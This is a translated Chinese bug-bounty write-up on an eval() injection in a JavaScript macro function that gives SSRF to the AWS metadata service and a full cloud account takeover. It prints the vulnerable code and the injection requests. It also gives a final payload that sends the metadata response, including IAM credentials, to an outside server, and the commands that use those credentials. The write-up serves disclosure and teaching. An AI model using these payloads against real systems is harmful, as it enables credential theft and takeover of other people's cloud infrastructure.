> 原文链接: https://www.anquanke.com//post/id/161455 


# 看我如何利用NodeJS SSRF漏洞获得AWS完全控制权限


                                阅读量   
                                **140387**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：10degres.net
                                <br>原文地址：[http://10degres.net/aws-takeover-ssrf-javascript/](http://10degres.net/aws-takeover-ssrf-javascript/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t01c34437cd1e264182.jpg)](https://p1.ssl.qhimg.com/t01c34437cd1e264182.jpg)

## 概述

本文主要讲述了我参加Hackerone的漏洞赏金项目过程中，是如何发现一个漏洞的。在漏洞挖掘过程中，我连续12小时30分钟没有休息，一鼓作气地找到漏洞，实现漏洞利用，并报告了这一漏洞。借助这一漏洞，我对AWS的凭据进行了转储，从而完全获取到了AWS的控制权限：得到了20个Bucket和80个EC2实例（Amazon Elastic Compute Cloud）。这是我在漏洞挖掘的职业生涯中的最佳战绩，在漏洞挖掘过程中也学到了很多，所以接下来，我将分享这一过程中的收获。<br>
这个漏洞赏金项目是由ArticMonkey公司发起的，他们开发了一种自定义宏语言，名为Banan++。最初，我并不知道用于编写Banan++的语言是什么，但我们可以从Web APP上得到一个JavaScript版本，于是对这一版本进行深入研究。<br>
最初的banan++.js文件是被压缩的，但仍然很大，压缩后有2.1M，优化调整后有2.5M，其中包括56441行和2546981个字符。实际上，我并不需要阅读所有的源代码。通过搜索一些特定的关键字，我找到了位于3348行的第一个函数，除此之外，大约还有135个函数要进行分析。这是我的游乐场。



## 发现问题

我开始从上面阅读代码，大部分功能都是与日起操作或数学操作有关，并没有任何潜在的漏洞。在经过了一段时间的阅读后，我终于在代码中发现了一个很有希望的Union()函数：

```
helper.prototype.Union = function() `{`
   for (var _len22 = arguments.length, args = Array(_len22), _key22 = 0; _key22 &lt; _len22; _key22++) args[_key22] = arguments[_key22];
   var value = args.shift(),
    symbol = args.shift(),
    results = args.filter(function(arg) `{`
     try `{`
      return eval(value + symbol + arg)
     `}` catch (e) `{`
      return !1
     `}`
    `}`);
   return !!results.length
  `}`
```

不知你是否注意到了其中的eval()函数？我将代码复制到本地的HTML文件中，以便进行更多测试。<br>
基本上，这一函数的参数可以取0至无限，但当参数大于等于3时，事情开始发生了变化。这一eval()函数用于在第二个参数的帮助下，比较第一个和第三个参数，然后开始测试后续的第四个、第五个等等。正常的用法，应该是类似于Union(1,’&lt;’,3);。如果在测试过程中，有一个结果为True或False，那么返回值为True。<br>
但是，这个过程却不会对参数的类型和值进行任何过滤或处理。在我最喜欢的调试器-alert()-的帮助下，我发现可以通过多种不同的方式实现漏洞利用：

```
Union( 'alert()//', '2', '3' );
Union( '1', '2;alert();', '3' );
Union( '1', '2', '3;alert()' );
...
```



## 找到注入点

现在已经发现了一个存在漏洞的函数，这总是好的，但我需要的其实是能够注入一些恶意代码的输入。我之前已经看过一些使用Banan++函数的POST参数，所以就在Burp Suite的历史中快速搜索了一下，得到了如下内容：

```
POST /REDACTED HTTP/1.1
Host: api.REDACTED.com
Connection: close
Content-Length: 232
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3502.0 Safari/537.36 autochrome/red
Content-Type: application/json;charset=UTF-8
Referer: https://app.REDACTED.com/REDACTED
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: auth=REDACTED

`{`...REDACTED...,"operation":"( Year( CurrentDate() ) &gt; 2017 )"`}`

```

响应如下：

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 54
Connection: close
X-Content-Type-Options: nosniff
X-Xss-Protection: 1
Strict-Transport-Security: max-age=15768000; includeSubDomains
...REDACTED...

[`{`"name":"REDACTED",...REDACTED...`}`]
```

参数operation似乎是一个不错的选择。那我们接下来就对它进行测试！



## 进行注入

由于我对Banan++一无所知，所以不得不进行一些测试，以便找出我可以注入的代码类型。手动模糊测试的过程如下。

```
`{`...REDACTED...,"operation":"'"&gt;&lt;"`}`
`{`"status":400,"message":"Parse error on line 1...REDACTED..."`}`

```

```
`{`...REDACTED...,"operation":null`}`
[]
```

```
`{`...REDACTED...,"operation":"0"`}`
[]
```

```
`{`...REDACTED...,"operation":"1"`}`
[`{`"name":"REDACTED",...REDACTED...`}`]
```

```
`{`...REDACTED...,"operation":"a"`}`
`{`"status":400,"message":"Parse error on line 1...REDACTED..."`}`
```

```
`{`...REDACTED...,"operation":"a=1"`}`
`{`"status":400,"message":"Parse error on line 1...REDACTED..."`}`
```

```
`{`...REDACTED...,"operation":"alert"`}`
`{`"status":400,"message":"Parse error on line 1...REDACTED..."`}`
```

```
`{`...REDACTED...,"operation":"alert()"`}`
`{`"status":400,"message":"Function 'alert' is not defined"`}`
```

```
`{`...REDACTED...,"operation":"Union()"`}`
[]
```

在这里，我得到的结论是：<br>
1、在这里，并不能注入任何我想要的JavaScript；<br>
2、我可以注入Banan++函数；<br>
3、响应似乎就像一个True/False标志，取决于参数operation是True还是False（这非常有用，它有助于验证我注入的代码）。<br>
我们继续使用Union()：

```
`{`...REDACTED...,"operation":"Union(1,2,3)"`}`
`{`"status":400,"message":"Parse error on line 1...REDACTED..."`}`
```

```
`{`...REDACTED...,"operation":"Union(a,b,c)"`}`
`{`"status":400,"message":"Parse error on line 1...REDACTED..."`}`
```

```
`{`...REDACTED...,"operation":"Union('a','b','c')"`}`
`{`"status":400,"message":"Parse error on line 1...REDACTED..."`}`
```

```
`{`...REDACTED...,"operation":"Union('a';'b';'c')"`}`
[`{`"name":"REDACTED",...REDACTED...`}`]
```

```
`{`...REDACTED...,"operation":"Union('1';'2';'3')"`}`
[`{`"name":"REDACTED",...REDACTED...`}`]
```

```
`{`...REDACTED...,"operation":"Union('1';'&lt;';'3')"`}`
[`{`"name":"REDACTED",...REDACTED...`}`]
```

```
`{`...REDACTED...,"operation":"Union('1';'&gt;';'3')"`}`
[]]
```

完美！如果1&lt;3，那么响应中就包含着有效的数据（True）。但如果1&gt;3，那么响应为空（False）。而参数必须使用分号来分隔。现在，我们就可以尝试真正的攻击了。



## fetch：新的XMLHttpRequest

因为请求是对API的ajax调用，只返回JSON数据，所以它显然不是在客户端一侧的注入。我从之前的报告中也了解到，ArticMonkey倾向于使用很多服务器端的JavaScript。<br>
但这没关系，我必须尝试所有可能性。也许我可以触发一个错误，获得有关JavaScript运行的系统的信息。自从我进行本地测试以后，我明确知道了如何注入恶意代码。之后，我尝试了基本的XSS Payload和具有恶意格式的JavaScript，但最后得到的只是和之前一样的错误。<br>
再然后，我尝试触发HTTP请求。<br>
通过ajax调用第一个：

```
x = new XMLHttpRequest;
x.open( 'GET','https://poc.myserver.com' );
x.send();
```

但是，没有得到任何内容。我也尝试过HTML注入：

```
i = document.createElement( 'img' );
i.src = '&lt;img src="https://poc.myserver.com/xxx.png"&gt;';
document.body.appendChild( i );
```

同样没有收获。接下来，进行更多尝试：

```
document.body.innerHTML += '&lt;img src="https://poc.myserver.com/xxx.png"&gt;';

document.body.innerHTML += '&lt;iframe src="https://poc.myserver.com"&gt;';
```

许多时候，我们必须走一些弯路，才能知道这是一条弯路。显然，HTML代码的思路是错误的。碰壁之后，我们回到ajax请求上，我花费了很长的时间才弄明白它的工作原理。<br>
这时，我回想起，ArticMonkey在他们的前端使用了ReactJS，后来才知道他们使用了NodeJS服务器端。无论如何，我在Google上进行了搜索，找到如何用它来执行ajax请求，并在官方文档（ [https://reactjs.org/docs/faq-ajax.html](https://reactjs.org/docs/faq-ajax.html) ）中找到了解决方案，解决方案中指出应该使用fetch()函数（ [https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) ），这是执行ajax调用的新标准，也是解决问题的关键。<br>
我注入了以下内容：

```
fetch('https://poc.myserver.com')
```

立刻，就在我的Apache日志中获得了一行新的记录。<br>
尽管现在，它能够Ping我的服务器，但这还是一个盲目地SSRF，我并没有得到任何响应。接下来，我尝试去连接两个请求，其中第二个请求负责发送第一个请求的结果。具体如下：

```
x1 = new XMLHttpRequest;
x1.open( 'GET','https://...', false );
x1.send();
r = x1.responseText;

x2 = new XMLHttpRequest;
x2.open( 'GET','https://poc.myserver.com/?r='+r, false );
x2.send();
```

又一次，我查询到了fetch()函数的正确语法，并成功使用，感谢StackOverflow。<br>
在使用下面代码时，能够正确运行：

```
fetch('https://...').then(res=&gt;res.text()).then((r)=&gt;fetch('https://poc.myserver.com/?r='+r));
```

当然，这也在意料之中。



## 通向胜利的SSRF

我首先尝试读取本地文件

```
fetch('file:///etc/issue').then(res=&gt;res.text()).then((r)=&gt;fetch('https://poc.myserver.com/?r='+r));
```

但在我的Apache日志文件中，响应（r参数）为空。<br>
由于我发现了一些与ArticMonkey相关的S3 Bucket（articmonkey-xxx），因此我认为该公司也可能将AWS服务器用于他们的Web APP中。在一些响应的X-Cache头部中，这一观点也得到了验证。于是，我迅速使用了云实例最常见的SSRF URL列表（ [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection) ）。<br>
当我试图访问实例的元数据时，得到了想要的效果。<br>[![](https://p3.ssl.qhimg.com/dm/1024_576_/t01ff5eadde9077fa92.png)](https://p3.ssl.qhimg.com/dm/1024_576_/t01ff5eadde9077fa92.png)<br>
最后，我借助JavaScript中的SSRF漏洞，成功获取了AWS的完全控制权限。<br>
最终Payload如下：

```
`{`...REDACTED...,"operation":"Union('1';'2;fetch("http://169.254.169.254/latest/meta-data/").then(res=&gt;res.text()).then((r)=&gt;fetch("https://poc.myserver.com/?r="+r));';'3')"`}`
```

在对输出内容进行解码后，发现返回的是目录列表：

```
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
hostname
iam/
...
```

由于我对AWS的元数据一无所知，所以我花费了一些时间来探索目录和所有文件。其中，最有趣的一个文件是 [http://169.254.169.254/latest/meta-data/iam/security-credentials/](http://169.254.169.254/latest/meta-data/iam/security-credentials/)&lt;ROLE&gt; 。它返回的内容是：

```
`{`
  "Code":"Success",
  "Type":"AWS-HMAC",
  "AccessKeyId":"...REDACTED...",
  "SecretAccessKey":"...REDACTED...",
  "Token":"...REDACTED...",
  "Expiration":"2018-09-06T19:24:38Z",
  "LastUpdated":"2018-09-06T19:09:38Z"
`}`
```



## 对凭据的利用

尽管现在，我的漏洞挖掘过程已经结束。但我希望能展现出凭据泄漏所带来的严重危害。我试图使用这些凭据来冒充这家公司。我们知道，这些凭据都是临时的，只在短时间内有效，大概也只有5分钟左右。但是，5分钟已经足够我将自己的凭据进行替换，并进行复制粘贴。<br>
针对SSRF和AWS Master的问题，我在Twitter上寻求了帮助。感谢大家的帮忙，最后我终于在AWS Identity and Access Management的用户指南中找到了解决方案。这是我的失误，之前没有阅读文档，并且只使用了AccessKeyId和SecretAccessKey。实际上，我们还必须导出令牌。

```
$ export AWS_ACCESS_KEY_ID=AKIAI44...
$ export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI...
$ export AWS_SESSION_TOKEN=AQoDYXdzEJr...
```

接下来，使用以下命令检查我当前的身份，证明不再是自己原来的用户。

```
aws sts get-caller-identity
```

至此，就能够证明已经成功接管了AWS。

[![](https://p4.ssl.qhimg.com/dm/1024_576_/t013005bbfab2e41d72.png)](https://p4.ssl.qhimg.com/dm/1024_576_/t013005bbfab2e41d72.png)上图左侧是由ArticMonkey配置的EC2实例的列表，可能是他们系统中的重要文件。<br>
右侧展现了该公司有20个Bucket，其中包含来自客户的高度敏感数据、用于Web应用程序的静态文件和服务器的日志及备份（根据Bucket名称判断）。其产生的影响非常严重。



## 时间节点

2018年9月6日 12:00 开始漏洞挖掘<br>
2018年9月7日 00:30 报告漏洞详情<br>
2018年9月7日 19:30 漏洞已经修复，并获得奖励<br>
感谢ArticMonkey如此快速地修复漏洞并发放了奖励，也要感谢他们授权我发表这篇文章。



## 总结

通过这个漏洞，我学到了很多内容：<br>
1、ReactJS、fetch()函数、AWS元数据的原理；<br>
2、官方文档始终是重要的（有用）信息来源；<br>
3、在每一步，都会遇到新的问题，必须要积极查找资料，从多个角度尝试，竭尽全力，不要放弃；<br>
4、我现在知道自己居然可以从0开始完全攻破一个系统，获得了满满的成就感。
